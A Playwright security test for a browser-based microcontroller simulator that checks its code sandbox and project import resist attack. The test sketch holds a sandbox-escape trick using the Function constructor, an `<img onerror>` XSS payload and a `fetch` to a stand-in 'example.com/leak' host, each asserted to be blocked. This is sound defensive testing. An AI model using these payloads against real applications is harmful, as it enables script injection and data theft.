// Run: NODE_PATH=<dir with playwright-core> node tests/e2e/security.e2e.js [baseURL]
// Needs Chrome at CHROME=/usr/bin/google-chrome and the app served over HTTP.
const { chromium } = require('playwright-core'); const path = require('path'); const assert = require('assert');
const URL = process.argv[2] || 'http://localhost:8765/';
(async () => {
  const b = await chromium.launch({ executablePath: process.env.CHROME || '/usr/bin/google-chrome' });
  const pg = await b.newPage(); const dialogs = [], errs = [], net = [];
  pg.on('dialog', d => { dialogs.push(d.message()); d.dismiss(); }); pg.on('pageerror', e => errs.push(e.message)); pg.on('console', m => { if (/Content Security Policy/i.test(m.text())) errs.push('CSP: ' + m.text()); });
  pg.on('request', r => { if (!r.url().startsWith(URL) && !r.url().startsWith('data:') && !r.url().startsWith('blob:')) net.push(r.url()); });
  await pg.goto(URL);
  // 1. sandbox bypass attempt
  await pg.evaluate(() => { document.querySelector('#code').value = `void setup(){
    let g = (()=>{}).constructor('return this')();
    let names = ['fetch','XMLHttpRequest','WebSocket','WebTransport','Worker','SharedWorker','navigator','indexedDB','caches','EventSource','BroadcastChannel','importScripts','postMessage','location'];
    let out = '';
    for (let i = 0; i < names.length; i++) { out += names[i] + '=' + (typeof g[names[i]]) + ';'; }
    Serial.println(out); Serial.println("<img src=x onerror=alert(7)>");
    try { g.fetch('https://example.com/leak'); } catch (e) { Serial.println('fetch blocked'); }
  }
  void loop(){ delay(100); }`; });
  await pg.click('#run'); await pg.waitForTimeout(800);
  const con = await pg.textContent('#console');
  for (const n of ['fetch', 'XMLHttpRequest', 'WebSocket', 'WebTransport', 'Worker', 'SharedWorker', 'navigator', 'indexedDB', 'caches', 'EventSource', 'BroadcastChannel', 'importScripts', 'postMessage', 'location'])
    assert.ok(con.includes(n + '=undefined;'), 'sandbox leaks ' + n + ': ' + con);
  assert.ok(con.includes('fetch blocked'), con); assert.ok(con.includes('<img src=x onerror=alert(7)>'));
  assert.equal(await pg.evaluate(() => document.querySelectorAll('#console img').length), 0, 'serial html rendered');
  await pg.click('#stop');
  // 2. malicious import
  await pg.setInputFiles('#import', path.join(__dirname, '../fixtures/malicious.json')); await pg.waitForTimeout(300);
  await pg.click('#run'); await pg.waitForTimeout(800); await pg.click('#codeTab'); await pg.click('#codeTab');
  const injected = await pg.evaluate(() => document.querySelectorAll('img, script:not([src]), [onerror], [onload], [onmouseover]').length);
  const ids = await pg.evaluate(() => window.__sim.proj.parts.map(p => p.id));
  const con2 = await pg.textContent('#console');
  assert.equal(injected, 0, 'injected elements'); assert.deepEqual(ids, ['R1', 'D1']); assert.equal(dialogs.length, 0, 'dialogs: ' + dialogs);
  assert.deepEqual(net, [], 'network: ' + net); assert.deepEqual(errs, []);
  console.log('security e2e OK'); await b.close();
})().catch(e => { console.error('FAIL', e.message); process.exit(1); });
